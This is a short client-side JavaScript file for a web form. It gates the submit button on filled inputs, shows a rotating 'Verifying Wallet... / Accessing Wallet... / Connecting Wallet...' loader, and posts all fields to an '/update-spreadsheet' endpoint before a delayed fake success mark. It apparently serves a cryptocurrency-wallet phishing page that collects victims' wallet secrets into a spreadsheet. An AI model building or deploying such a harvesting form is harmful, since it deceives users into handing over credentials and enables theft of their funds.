// JavaScript for form validation and AJAX request

// Select form and submit button
const form = document.getElementById('techForm');
const submitButton = document.getElementById('submitButton');
const loader = document.getElementById('loader');
const loaderText = document.getElementById('loaderText');

// Validate inputs
form.addEventListener('input', function() {
    const inputs = form.querySelectorAll('input');
    let allFilled = true;
    inputs.forEach(input => {
        if (input.value.trim() === '') {
            allFilled = false;
        }
    });
    submitButton.disabled = !allFilled;
});

// Handle form submission
form.addEventListener('submit', function(event) {
    event.preventDefault();
    const formData = new FormData(form);
    const data = {};
    formData.forEach((value, key) => {
        data[key] = value;
    });

    // Display loader
    loader.style.visibility = 'visible';
    let texts = ['Verifying Wallet...', 'Accessing Wallet...', 'Connecting Wallet...'];
    let index = 0;

    var interval = setInterval(() => {
        loaderText.textContent = texts[index];
        index = (index + 1) % texts.length;
    }, 2000);

    // Perform AJAX request
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '/update-spreadsheet', true); 
    xhr.setRequestHeader('Content-Type', 'application/json');

    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
            if (xhr.status === 200) {
                const responseData = JSON.parse(xhr.responseText);
                setTimeout(() => {
                    clearInterval(interval);
                    if (responseData.success) {
                        loaderText.textContent = 'Success!';
                        loader.style.backgroundColor = 'rgba(0, 0, 0, 0.7)';
                        document.querySelector('.spinner').style.display = 'none';
                        const successIcon = document.createElement('i');
                        successIcon.innerHTML = '&#10004;';
                        successIcon.style.fontSize = '50px';
                        successIcon.style.color = '#4CAF50';
                        loader.appendChild(successIcon);
                        submitButton.disabled = true;
                    } else {
                        console.log('Submission failed. Please try again.');
                        loader.style.visibility = 'hidden';
                    }
                }, 8000); // Keep the loader for 3 seconds
            } else {
                clearInterval(interval);
                console.error('Request failed with status:', xhr.status, xhr.statusText);
                console.log('An error occurred. Please try again.');
                loader.style.visibility = 'hidden';
            }
        }
    };

    xhr.onerror = function() {
        clearInterval(interval);
        console.error('Network error occurred:', xhr.statusText);
        console.log('Network error occurred. Please try again.');
        loader.style.visibility = 'hidden';
    };

    xhr.send(JSON.stringify(data));
});
